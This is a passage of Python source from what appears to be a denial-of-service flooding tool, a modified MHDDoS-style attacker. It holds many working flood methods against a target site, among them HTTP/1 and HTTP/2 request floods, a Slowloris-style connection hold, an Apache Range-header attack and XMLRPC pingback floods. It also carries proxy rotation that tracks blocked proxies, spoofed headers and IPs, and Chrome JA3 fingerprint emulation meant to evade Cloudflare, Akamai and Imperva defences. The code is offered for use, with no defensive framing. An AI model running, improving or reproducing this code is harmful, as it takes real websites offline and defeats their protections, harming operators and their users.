        path = self.get_random_target_path()
        request_line = f"{self._req_type} {path} HTTP/1.1\r\n"
        
        # We also need dynamic headers (UA, Mobile, Platform)
        # Note: randHeadercontent uses a random UA but doesn't sync Sec-Ch-Ua
        # For maximum quality, we should use build_consistent_headers here too.
        ua = randchoice(self._useragents)
        consistent_headers = self.build_consistent_headers(ua)
        
        return (f"{request_line}"
                f"Host: {self._target.authority}\r\n"
                f"User-Agent: {ua}\r\n"
                f"{consistent_headers}"
                f"Referer: {randchoice(self._referers)}\r\n"
                f"{other if other else ''}"
                "\r\n").encode("utf-8")

    def open_connection(self, host=None) -> socket:
        proxy = None
        if self._proxies:
            # [PHASE 13] Dynamic Random Selection for Live Synchronization
            for _ in range(20): 
                p = randchoice(self._proxies)
                p_str = str(p) # [FIX] Use str(p) instead of p.proxy
                
                # Check if proxy is in Cooling Period
                burn_time = BURNED_PROXIES.get(p_str)
                if burn_time:
                    if time() - burn_time > COOLING_PERIOD:
                        with suppress(KeyError):
                            del BURNED_PROXIES[p_str]
                    else:
                        continue 
                
                self._current_proxy = p_str
                proxy = p
                break
            
            if len(BURNED_PROXIES) > len(self._proxies) * 0.8:
                global RECYCLE_EVENT, IS_RECYCLING
                if not IS_RECYCLING:
                    RECYCLE_EVENT.set()
            
            if not proxy:
                RECYCLE_EVENT.set()
                sleep(2)
                proxy = randchoice(self._proxies)
                self._current_proxy = str(proxy)
        
        sock = None
        
        # [V7] Multi-IP Edge Array Targeting
        target_ip = host
        if hasattr(self, 'host_array') and self.host_array:
            target_ip = randchoice(self.host_array)
            self._raw_target = (target_ip, (self._target.port or 80))
            
        try:
            if proxy:
                sock = proxy.open_socket(AF_INET, SOCK_STREAM)
            else:
                sock = socket(AF_INET, SOCK_STREAM)

            sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
            sock.settimeout(3)  # [V6] Reduced from 5s to avoid idle threads on dead proxies
            
            # [FIX] Always pass tuple (ip, port) to connect()
            connect_target = self._raw_target
            if target_ip:
                connect_target = (target_ip, (self._target.port or 80))
            sock.connect(connect_target)
            
            if self._target.scheme == "https":
                sock = ctx.wrap_socket(sock, server_hostname=self._target.host)
            
            return sock
        except Exception as e:
            # [NEW] Connection Debugging
            # if logger.level <= 10: logger.debug(f"Connection Failed: {e}")
            Tools.safe_close(sock)
            return None

    @property
    def randHeadercontent(self) -> str:
        return (f"User-Agent: {randchoice(self._useragents)}\r\n"
                f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                self.SpoofIP)

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                            "DYN", "SLOW", "PPS", "APACHE",
                                            "BOT", "RHEX", "STOMP"} \
            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
            else "REQUESTS"

    def POST(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 44\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/json\r\n\r\n"
             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
        s = None
        with  suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def TOR(self) -> None:
        provider = "." + randchoice(tor2webs)
        target = self._target.authority.replace(".onion", provider)
        payload: Any = str.encode(self._payload +
                                  f"Host: {target}\r\n" +
                                  self.randHeadercontent +
                                  "\r\n")
        s = None
        target = self._target.host.replace(".onion", provider), self._raw_target[1]
        with suppress(Exception), self.open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STRESS(self) -> None:
        s = None
        try:
            s = self.open_connection()
            global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
            CONNECTIONS_SENT += 1

            for _ in range(self._rpc):
                # [OPTIMIZED] Dynamic Path
                path = self.get_random_target_path()
                ua = randchoice(self._useragents)
                headers = self.build_consistent_headers(ua)
                
                # Rebuild payload manually to include dynamic path
                payload = (f"{self._req_type} {path} HTTP/1.1\r\n"
                           f"Host: {self._target.authority}\r\n"
                           f"User-Agent: {ua}\r\n"
                           f"{headers}"
                           f"Content-Length: 524\r\n"
                           f"X-Requested-With: XMLHttpRequest\r\n"
                           f"Content-Type: application/json\r\n\r\n"
                           f"{{\"data\": {ProxyTools.Random.rand_str(512)}}}")
                
                if Tools.send(s, payload.encode("utf-8")):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
                    if int(REQUESTS_SENT) < 50:
                         print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] STRESS: Packet Sent to {self._target.authority}")
                    # [FIX] Non-blocking status check AFTER send
                    import select
                    readable, _, _ = select.select([s], [], [], 0.01)
                    if readable:
                        try:
                            response_start = s.recv(64).decode('utf-8', errors='ignore')
                            if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
                                status_code = response_start.split(" ")[1]
                                if status_code in {"403", "429"}:
                                    if hasattr(self, '_current_proxy'):
                                        pass  #BURNED_PROXIES[self._current_proxy] = time()
                                    raise Exception("Proxy Blocked")
                        except Exception as e:
                            if "Blocked" in str(e): raise e
        except Exception as e:
            pass
        Tools.safe_close(s)

    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            "Cookie: _ga=GA%s;"
            " _gat=1;"
            " __cfduid=dc232334gwdsd23434542342342342475611928;"
            " %s=%s\r\n" %
            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
             ProxyTools.Random.rand_str(32)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def APACHE(self) -> None:
        payload: bytes = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i
                                            for i in range(1, 1024)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STEALTH_JA3(self):
        """[V6] Uses tls_client to emulate exact Chrome JA3 fingerprint
        Perfect for evading Akamai, Cloudflare Bot Fight Mode, and Imperva."""
        target_domain = self._target.user or self._target.host
        # Use cache-busting path if available for maximum origin impact
        if hasattr(self, '_chaos_get_cache_busting_path'):
            path = self._chaos_get_cache_busting_path()
        else:
            path = self.get_random_target_path()
        # Apply organic query fuzzing to dynamic paths bypass logic
        path = self._chaos_fuzz_query(path)
        
        # 15% chance to mutate the path into a Zero-Day Heuristic WAF trap
        if randint(1, 100) <= 15:
            path = self._chaos_generate_mutant_payload(path)
            
        safe_path = path if path.startswith("/") else f"/{path}"
        url = f"{self._target.scheme}://{target_domain}{safe_path}"

        proxy_url = None
        if self._proxies:
            global BURNED_PROXIES
            for _ in range(5):
                p = randchoice(self._proxies)
                p_str = str(p)
                burn_time = BURNED_PROXIES.get(p_str)
                if not burn_time or (time() - burn_time >= COOLING_PERIOD):
                    proxy_url = p_str if "://" in p_str else f"http://{p_str}"
                    self._current_proxy = p_str
                    break

        global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
        try:
            # StealthClient will use tls_client internally
            session = StealthClient.create_session(proxy_url)
            
            # Use complete browser profile for maximum authenticity
            if hasattr(self, '_BROWSER_PROFILES') and self._BROWSER_PROFILES:
                headers = self._chaos_get_browser_profile()
            else:
                headers = {
                    "User-Agent": randchoice(self._useragents),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate, br",
                }
            headers["Connection"] = "keep-alive"
            # Add realistic referer from session journey
            if hasattr(self, '_chaos_get_smart_referer'):
                headers["Referer"] = self._chaos_get_smart_referer()
            # Inject all harvested cookies + cf_clearance for maximum trust
            if hasattr(self, '_chaos_get_cookie_header'):
                cookie_str = self._chaos_get_cookie_header()
                if cookie_str:
                    headers["Cookie"] = cookie_str
            elif hasattr(self, '_cf_clearance') and self._cf_clearance:
                headers["Cookie"] = f"cf_clearance={self._cf_clearance}"
                
            for _ in range(self._rpc):
                resp = session.get(url, headers=headers, timeout=5)
                REQUESTS_SENT += 1
                CONNECTIONS_SENT += 1
                BYTES_SEND += 1000  # Estimate
                
                if resp.status_code in {403, 429}:
                    if self._proxies and hasattr(self, '_current_proxy'):
                        pass  #BURNED_PROXIES[self._current_proxy] = time()
                    break
        except Exception:
            pass

    def XMLRPC(self) -> None:
        payload: bytes = self.generate_payload(
            ("Content-Length: 345\r\n"
             "X-Requested-With: XMLHttpRequest\r\n"
             "Content-Type: application/xml\r\n\r\n"
             "<?xml version='1.0' encoding='iso-8859-1'?>"
             "<methodCall><methodName>pingback.ping</methodName>"
             "<params><param><value><string>%s</string></value>"
             "</param><param><value><string>%s</string>"
             "</value></param></params></methodCall>") %
            (ProxyTools.Random.rand_str(64),
             ProxyTools.Random.rand_str(64)))[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def PPS(self) -> None:
        # [OPTIMIZED] Parsed Packet Storm (Dynamic)
        s = None
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                payload = self.generate_payload()
                if Tools.send(s, payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
        Tools.safe_close(s)

    def KILLER(self) -> None:
        # [FIX] Semaphore to prevent fork bomb (max 500 concurrent sub-threads)
        sem = __import__('threading').Semaphore(500)
        while self._synevent.is_set():
            sem.acquire()
            def _fire():
                try:
                    self.GET()
                finally:
                    sem.release()
            Thread(target=_fire, daemon=True).start()

    def GET(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                if Tools.send(s, payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
        Tools.safe_close(s)

    def BOT(self) -> None:
        payload: bytes = self.generate_payload()
        p1, p2 = str.encode(
            "GET /robots.txt HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: text/plain,text/html,*/*\r\n"
            "User-Agent: %s\r\n" % randchoice(search_engine_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n\r\n"), str.encode(
            "GET /sitemap.xml HTTP/1.1\r\n"
            "Host: %s\r\n" % self._target.raw_authority +
            "Connection: Keep-Alive\r\n"
            "Accept: */*\r\n"
            "From: googlebot(at)googlebot.com\r\n"
            "User-Agent: %s\r\n" % randchoice(search_engine_agents) +
            "Accept-Encoding: gzip,deflate,br\r\n"
            "If-None-Match: %s-%s\r\n" % (ProxyTools.Random.rand_str(9),
                                          ProxyTools.Random.rand_str(4)) +
            "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
        s = None
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), self.open_connection() as s:
            if Tools.send(s, p1):
                REQUESTS_SENT += 1
                BYTES_SEND += len(p1)
            if Tools.send(s, p2):
                REQUESTS_SENT += 1
                BYTES_SEND += len(p2)
            for _ in range(self._rpc):
                if Tools.send(s, payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
        Tools.safe_close(s)

    def EVEN(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), self.open_connection() as s:
            while Tools.send(s, payload) and s.recv(1):
                REQUESTS_SENT += 1
                BYTES_SEND += len(payload)
                continue
        Tools.safe_close(s)

    def OVH(self) -> None:
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(min(self._rpc, 5)):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def CFB(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                # [OPTIMIZED] Dynamic Path
                path = self.get_random_target_path()
                full_url = f"{self._target.scheme}://{self._target.authority}{path}"
                
                if pro:
                    with s.get(full_url,
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(full_url) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def CFBUAM(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, payload)
            sleep(5.01)
            ts = time()
            for _ in range(self._rpc):
                Tools.send(s, payload)
                if time() > ts + 120: break
        Tools.safe_close(s)

    def AVB(self):
        payload: bytes = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                sleep(max(self._rpc / 1000, 1))
                Tools.send(s, payload)
        Tools.safe_close(s)

    def DGB(self):
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception):
            if self._proxies:
                pro = randchoice(self._proxies)
                with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest()) as ss:
                    for _ in range(min(self._rpc, 5)):
                        sleep(min(self._rpc, 5) / 100)
                        with ss.get(self._target.human_repr(),
                                    proxies=pro.asRequest()) as res:
                            REQUESTS_SENT += 1
                            BYTES_SEND += Tools.sizeOfRequest(res)
                            continue

                Tools.safe_close(ss)

            with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
                for _ in range(min(self._rpc, 5)):
                    sleep(min(self._rpc, 5) / 100)
                    with ss.get(self._target.human_repr()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)

            Tools.safe_close(ss)

    def DYN(self):
        # [OPTIMIZED] Dynamic Host + Dynamic Path
        path = self.get_random_target_path()
        ua = randchoice(self._useragents)
        headers = self.build_consistent_headers(ua)
        
        request_line = f"{self._req_type} {path} HTTP/1.1\r\n"
        # [PHASE 15] DYN Host Logic: Disable random subdomains if Host Spoofing is active
        # Origin IPs usually don't support wildcard virtual hosts.
        if hasattr(self, '_raw_target') and self._raw_target[0] != self._target.host:
             host_header = f"Host: {self._target.authority}\r\n"
        else:
             host_header = f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n"
        
        payload: Any = (f"{request_line}"
                        f"{host_header}"
                        f"User-Agent: {ua}\r\n"
                        f"{headers}"
                        "\r\n").encode("utf-8")
        s = None
        try:
            s = self.open_connection()
            global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND
            CONNECTIONS_SENT += 1
            for _ in range(self._rpc):
                if Tools.send(s, payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
                    if int(REQUESTS_SENT) < 50:
                        print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] DYN: Packet Sent")
                    # [FIX] Non-blocking status check using select instead of recv
                    import select
                    readable, _, _ = select.select([s], [], [], 0.01)
                    if readable:
                        try:
                            response_start = s.recv(64).decode('utf-8', errors='ignore')
                            if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
                                status_code = response_start.split(" ")[1]
                                if status_code in {"403", "429"}:
                                    pass  #BURNED_PROXIES[self._current_proxy] = time()
                                    raise Exception("Proxy Blocked")
                        except (BlockingIOError, ssl.SSLWantReadError):
                            pass
                        except Exception as e:
                            if "Blocked" in str(e): raise e
        except Exception as e:
            pass
        Tools.safe_close(s)

    def POST_DYN(self):
        # [PHASE 2] Non-Cacheable POST Flood
        path = self.get_random_target_path()
        ua = randchoice(self._useragents)
        headers = self.build_consistent_headers(ua)
        
        # Build realistic JSON Payload
        json_data = f'{{"form_id": "{ProxyTools.Random.rand_str(8)}", "utm_source": "google", "data": "{ProxyTools.Random.rand_str(randint(200, 400))}"}}'
        
        # [PHASE 4] Referer Spoofing
        ref = randchoice(self.crawled_paths) if self.crawled_paths else randchoice(self._referers)
        
        payload = (f"POST {path} HTTP/1.1\r\n"
                   f"Host: {self._target.authority}\r\n"
                   f"User-Agent: {ua}\r\n"
                   f"{headers}"
                   f"Referer: {ref}\r\n"
                   f"Content-Type: application/json\r\n"
                   f"Origin: {self._target.scheme}://{self._target.authority}\r\n"
                   f"Content-Length: {len(json_data)}\r\n\r\n"
                   f"{json_data}").encode("utf-8")
        s = None
        try:
            s = self.open_connection()
            global CONNECTIONS_SENT, BURNED_PROXIES, REQUESTS_SENT, BYTES_SEND
            CONNECTIONS_SENT += 1
            for _ in range(self._rpc):
                if Tools.send(s, payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
                    if int(REQUESTS_SENT) < 50:
                         print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] POST_DYN: Packet Sent")
                    # [FIX] Non-blocking status check using select
                    import select
                    readable, _, _ = select.select([s], [], [], 0.01)
                    if readable:
                        try:
                            response_start = s.recv(64).decode('utf-8', errors='ignore')
                            if response_start and ("HTTP/1.1" in response_start or "HTTP/1.0" in response_start):
                                status_code = response_start.split(" ")[1]
                                if status_code in {"403", "429"}:
                                    pass  #BURNED_PROXIES[self._current_proxy] = time()
                                    raise Exception("Proxy Blocked")
                        except (BlockingIOError, ssl.SSLWantReadError):
                            pass
                        except Exception as e:
                            if "Blocked" in str(e): raise e
        except:
            pass
        Tools.safe_close(s)

    def H2_FLOOD(self):
        # [PHASE 5 & 10] HTTP/2 Multiplexing Flood (Optimized Client)
        global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND, TOTAL_REQUESTS_SENT, RECYCLE_EVENT, IS_RECYCLING
        
        path = self.get_random_target_path()
        ua = randchoice(self._useragents)
        
        # Map raw proxy to httpx format
        proxy_url = None
        if self._proxies:
            # [PHASE 13] Use randchoice for shared pool sync
            for _ in range(20): # Increased attempts
                p = randchoice(self._proxies)
                p_str = str(p)
                burn_time = BURNED_PROXIES.get(p_str)
                if not burn_time or (time() - burn_time >= COOLING_PERIOD):
                    # [FIX] PyRoxy str(p) often includes prefix already. Avoid double prefix.
                    if "://" in p_str:
                        proxy_url = p_str
                    else:
                        prefix = "socks5://" if p.type in {ProxyType.SOCKS5, ProxyType.SOCKS4} else "http://"
                        proxy_url = f"{prefix}{p_str}"
                    
                    self._current_proxy = p_str 
                    break
            else:
                # [PHASE 13] Trigger recycle if all proxies are burned
                if not IS_RECYCLING:
                    RECYCLE_EVENT.set()
                sleep(2)
                return 

        # [PHASE 13] Correct URL Construction for Spoofing & httpx Compatibility
        target_domain = self._target.user or self._target.host
        
        # [FIX] Sanitize path to avoid double slashes (common in crawled links)
        safe_path = path if path.startswith("/") else f"/{path}"
        if safe_path.startswith("//"): 
            safe_path = "/" + safe_path.lstrip("/")

        clean_target_url = f"{self._target.scheme}://{self._target.host}{safe_path}"

        headers = {
            "User-Agent": ua,
            "Accept-Encoding": "gzip, deflate, br",
            "X-Forwarded-For": Tools.get_random_indo_ip(),
            "Referer": randchoice(self.crawled_paths) if self.crawled_paths else randchoice(self._referers),
            "Host": target_domain # Ensure Host header is correct even if hitting origin IP
        }

        try:
            # [PHASE 10] Reuse client if possible to prevent overhead
            client = getattr(self, '_h2_client', None)
            if client is None or client.is_closed:
                # [DEBUG] Optional: print(f"[DEBUG] H2 Thread {self._thread_id} connecting to {clean_target_url} via {proxy_url}")
                self._h2_client = httpx.Client(
                    http2=True,
                    verify=False,
                    proxy=proxy_url,
                    headers=headers,
                    timeout=5.0 # Increased timeout for slow proxies
                )
                client = self._h2_client
            # [PHASE 15] High-Intensity Multiplexing (50 concurrent streams per connection)
            for _ in range(50): 
                # [PHASE 15] SNI Fix for Host Spoofing: Ensure SSL handshake uses domain, not IP
                with client.stream("GET", clean_target_url, extensions={"sni_hostname": target_domain}) as resp:
                    CONNECTIONS_SENT += 1
                    REQUESTS_SENT += 1
                    TOTAL_REQUESTS_SENT += 1
                    # Track data sent/received
                    BYTES_SEND += 1000 # Approx headers + partial body
                    
                    if resp.status_code % 100 == 5:
                        print(f"[{int(CONNECTIONS_SENT)}] [STATUS {resp.status_code}] H2_FLOOD: Target Overloaded!")
                    elif resp.status_code in {403, 429}:
                        if proxy_url:
                            pass  #BURNED_PROXIES[p_str] = time()
                        raise Exception("Proxy Blocked")
                
                # [PHASE 13] Check if recycle target reached
                if len(BURNED_PROXIES) > len(self._proxies) * 0.8:
                    if not IS_RECYCLING:
                        RECYCLE_EVENT.set()
        except Exception as e:
            # [PHASE 15] Aggressive Silent Mode for common proxy noise
            noisy_errors = {"timed out", "handshake", "read operation", "Server disconnected", "Malformed reply", "EOF occurred"}
            err_msg = str(e)
            is_noisy = any(ne.lower() in err_msg.lower() for ne in noisy_errors)

            # [DEBUG] Only show initial errors or non-noisy core failures
            if int(REQUESTS_SENT) < 50 or (not is_noisy and int(REQUESTS_SENT) < 200):
                 print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] H2_FLOOD: {err_msg[:60]}...")
            
            # [PHASE 14] Client Persistence: Only kill on core protocol/auth failures
            critical_failures = {"NoneType", "protocol error", "socks", "proxy blocked"}
            is_critical = any(cf.lower() in err_msg.lower() for cf in critical_failures)

            if is_critical:
                if getattr(self, '_h2_client', None) is not None:
                    try: self._h2_client.close()
                    except: pass
                    self._h2_client = None

    def DOWNLOADER(self):
        payload: Any = self.generate_payload()

        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
                while 1:
                    sleep(.01)
                    data = s.recv(1)
                    if not data:
                        break
            Tools.send(s, b'0')
        Tools.safe_close(s)

    def BYPASS(self):
        global REQUESTS_SENT, BYTES_SEND
        pro = None
        if self._proxies:
            pro = randchoice(self._proxies)
        s = None
        with suppress(Exception), Session() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(self._target.human_repr(),
                               proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue

                with s.get(self._target.human_repr()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def GSB(self):
        s = None
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
                                                           self._target.raw_path_qs,
                                                           ProxyTools.Random.rand_str(6)) +
                             "Host: %s\r\n" % self._target.authority +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             
                             'Cache-Control: max-age=0\r\n'
                             'Connection: Keep-Alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
                if Tools.send(s, payload):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
        Tools.safe_close(s)

    def RHEX(self):
        randhex = str(randbytes(randchoice([32, 64, 128])))
        payload = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                        self._target.authority,
                                                        randhex) +
                             "Host: %s/%s\r\n" % (self._target.authority, randhex) +
                             self.randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             
                             'Cache-Control: max-age=0\r\n'
                             'Connection: keep-alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STOMP(self):
        dep = ('Accept-Encoding: gzip, deflate, br\r\n'
               
               'Cache-Control: max-age=0\r\n'
               'Connection: keep-alive\r\n'
               'Sec-Fetch-Dest: document\r\n'
               'Sec-Fetch-Mode: navigate\r\n'
               'Sec-Fetch-Site: none\r\n'
               'Sec-Fetch-User: ?1\r\n'
               'Sec-Gpc: 1\r\n'
               'Pragma: no-cache\r\n'
               'Upgrade-Insecure-Requests: 1\r\n\r\n')
        hexh = r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87' \
               r'\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F' \
               r'\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F' \
               r'\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84' \
               r'\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F' \
               r'\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98' \
               r'\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98' \
               r'\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B' \
               r'\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99' \
               r'\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C' \
               r'\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA '
        p1, p2 = str.encode("%s %s/%s HTTP/1.1\r\n" % (self._req_type,
                                                       self._target.authority,
                                                       hexh) +
                            "Host: %s/%s\r\n" % (self._target.authority, hexh) +
                            self.randHeadercontent + dep), str.encode(
            "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\n" % (self._req_type,
                                                          self._target.authority) +
            "Host: %s\r\n" % hexh +
            self.randHeadercontent + dep)
        s = None
        global REQUESTS_SENT, BYTES_SEND
        with suppress(Exception), self.open_connection() as s:
            if Tools.send(s, p1):
                REQUESTS_SENT += 1
                BYTES_SEND += len(p1)
            for _ in range(self._rpc):
                if Tools.send(s, p2):
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(p2)
        Tools.safe_close(s)

    def NULL(self) -> None:
        payload: Any = str.encode(self._payload +
                                  f"Host: {self._target.authority}\r\n" +
                                  "User-Agent: null\r\n" +
                                  "Referrer: null\r\n" +
                                  self.SpoofIP + "\r\n")
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOMB(self):
        assert self._proxies, \
            'This method requires proxies. ' \
            'Without proxies you can use github.com/codesenberg/bombardier'

        while True:
            proxy = randchoice(self._proxies)
            if proxy.type != ProxyType.SOCKS4:
                break

        res = run(
            [
                f'{bombardier_path}',
                f'--connections={self._rpc}',
                '--http2',
                '--method=GET',
                '--latencies',
                '--timeout=30s',
                f'--requests={self._rpc}',
                f'--proxy={proxy}',
                f'{self._target.human_repr()}',
            ],
            stdout=PIPE,
        )
        if self._thread_id == 0:
            print(proxy, res.stdout.decode(), sep='\n')

    def SLOW(self):
        payload: bytes = self.generate_payload()
        s = None
        try:
            s = self.open_connection()
            # Increment Global Counter for visual feedback
            # Increment Global Counter for visual feedback
            global REQUESTS_SENT, TOTAL_REQUESTS_SENT, CONNECTIONS_SENT
            REQUESTS_SENT += 1
            TOTAL_REQUESTS_SENT += 1
            CONNECTIONS_SENT += 1
            if int(REQUESTS_SENT) < 50:
                print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] SLOW: Connected to {self._target.authority} via Proxy")
            for _ in range(self._rpc):
                Tools.send(s, payload)
            
            while True:
                # Keep sending full payloads or keep-alives?
                # Original logic was weird. Let's just send keep-alive headers to existing connection
                if Tools.send(s, payload):
                     # print("[DEBUG] SLOW: Packet Sent")
                     pass
                
                # Check for response?
                # if s.recv(1): ... this blocks.
                
                for i in range(self._rpc):
                    # [NEW] Indonesian ISP Randomized Junk Header
                    junk_key = randchoice(["X-ISP", "X-Sponsor", "X-Route", "X-Provider"])
                    junk_val = randchoice(["Telkomsel", "Indihome", "XL-Axiata", "Biznet", "FirstMedia"])
                    Tools.send(s, (f"{junk_key}: {junk_val}\r\n").encode("utf-8"))
                    
                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                    Tools.send(s, keep)
                    sleep(self._rpc / 15)
                    break
        except Exception as e:
            err = str(e)
            if "timed out" in err or "Timeout" in err:
                # print(f"[DEBUG] SLOW: Connection Held (Timeout) - Good Sign")
                pass
            elif "[Errno 111]" in err or "Connection refused" in err:
                pass # Suppress Proxy Refused errors
            elif "[Errno 104]" in err or "Reset by peer" in err:
